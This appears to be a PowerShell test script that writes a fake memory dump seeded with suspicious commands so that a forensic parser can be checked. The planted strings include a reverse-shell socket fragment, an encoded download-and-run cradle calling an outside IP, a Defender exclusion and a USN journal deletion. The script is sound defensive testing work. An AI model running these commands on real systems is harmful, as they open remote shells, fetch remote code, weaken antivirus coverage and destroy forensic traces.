<#
    Makes a small fake RAM dump with planted PowerShell commands, so you can
    check the parser works without dumping a real PC.
        .\tests\New-TestDump.ps1 -Path .\test.raw
        .\RAMPSParser.ps1 -Path .\test.raw
    Expected: 4 suspicious hits (reverse shell, encoded download cradle,
    Defender exclusion, USN journal deletion) and 1 normal command.
#>
param([string]$Path = '.\test.raw')

$rnd = New-Object Random 7
$ms  = New-Object IO.MemoryStream
function Add-Junk([int]$n) {
    $b = New-Object byte[] $n
    $rnd.NextBytes($b)
    for ($i = 0; $i -lt $n; $i++) { if ($b[$i] -ge 0x20 -and $b[$i] -le 0x7E) { $b[$i] = 0 } }
    $ms.Write($b, 0, $n)
}
function Add-Ascii([string]$s) { $b = [Text.Encoding]::ASCII.GetBytes($s); $ms.Write($b, 0, $b.Length); $ms.WriteByte(0) }
function Add-Wide([string]$s)  { $b = [Text.Encoding]::Unicode.GetBytes($s); $ms.Write($b, 0, $b.Length); $ms.WriteByte(0); $ms.WriteByte(0) }

$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('IEX (New-Object Net.WebClient).DownloadString("http://45.12.3.9/s.ps1")'))

Add-Junk 3001; Add-Ascii '$client = New-Object System.Net.Sockets.TCPClient("10.0.0.5",4444);$stream = $client.GetStream()'
Add-Junk 777;  $ms.WriteByte(0x41); Add-Wide "powershell.exe -nop -w hidden -enc $enc"   # odd-aligned UTF-16
Add-Junk 2048; Add-Wide 'Get-ChildItem C:\Users -Recurse'
Add-Junk 999;  Add-Ascii 'Get-ChildItem C:\Users -Recurse'
Add-Junk 512;  Add-Wide 'Add-MpPreference -ExclusionPath C:\Cheats'
Add-Junk 1500; Add-Ascii '[Parameter(ValueFromPipeline)] Get-Something-Noise'
Add-Junk 300;  Add-Wide 'fsutil usn deletejournal /d c:'
Add-Junk 4000

[IO.File]::WriteAllBytes($ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path), $ms.ToArray())
Write-Host "Wrote test dump: $Path ($($ms.Length) bytes)"
